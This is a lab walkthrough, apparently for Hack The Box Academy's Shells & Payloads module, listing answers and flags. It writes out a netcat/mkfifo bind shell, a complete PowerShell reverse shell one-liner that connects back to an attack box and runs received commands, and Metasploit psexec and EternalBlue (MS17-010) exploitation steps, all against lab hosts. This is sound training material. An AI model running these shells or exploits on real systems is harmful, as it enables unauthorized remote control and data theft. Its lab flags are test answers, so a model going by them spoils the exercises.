# Shells & Payloads

## Anatomy of a shell

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



### Questions

1. Which two shell languages did we experiment with in this section? (Format: shellname\&shellname)

**bash\&powershell**

2. In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.

run pwnbox

`$PSVersionTable`

**Core**

## Bind Shells

### Questions

1. Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

**443**

2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

`ssh htb-student@10.129.201.134`

* PW: `HTB_@cademy_stdnt!`

**target-machine:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | sudo nc -l 10.129.201.134 443 > /tmp/f`

**my machine:** `sudo nc -nv 10.129.201.134 443`

`cd /customscripts`

`cat flag.txt`

**B1nD\_Shells\_r\_cool**

## Reverse Shells

We can run listener (nc) and the target will initiate the connection to us...

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Questions

1. When establishing a reverse shell session with a target, will the target act as a client or server?

**client**

2. Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

`xfreerdp /v: 10.129.247.106 /u:htb-student /p:HTB_@cademy_stdnt!`

`sudo nc -nlvp 443`

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.46',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

`whoami`

**shells-win10**\htb-student

## Automating Payloads & Delivery with Metasploit

### Questions

1. What command language interpreter is used to establish a system shell session with the target?

**powershell**

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

2. Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

`nmap -sVC -Pn 10.129.201.160`

`msfconsole -q`

msf -> `search smb`

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

lets use No. 57 (psexec)

msf -> `use 57`

msf -> `options`

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

msf -> `run`

`cd Users\htb-student\Documents`

`dir`

**staffsalaries.txt**

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



## Infiltrating Windows

Win vuln table

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Questions

1. What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')

**.bat**

2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)

**MS17-010**

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\\

`nmap -v -A 10.129.201.97`

* host running Win Server 2016 Standard 6.3
*

    <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

`msfconsole -q`

`use auxiliary/scanner/smb/smb_ms17_010`

`options`

`set RHOSTS 10.129.201.97`

`run`

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**OK, it is vuln to MS17-010 (ETERNAL BLUE)**

`search eternalblue`

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

`use 1` (psexec)

`set RHOSTS 10.129.201.97`

`set LHOST tun0`

`set LPORT 4444`

`run`

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>



## Infiltrating Unix/Linux

* 70% webservers run on Unix-based system...
* Common questions...what distro, what shell, what functions of network, what app is hosting, any vulns?



### Questions

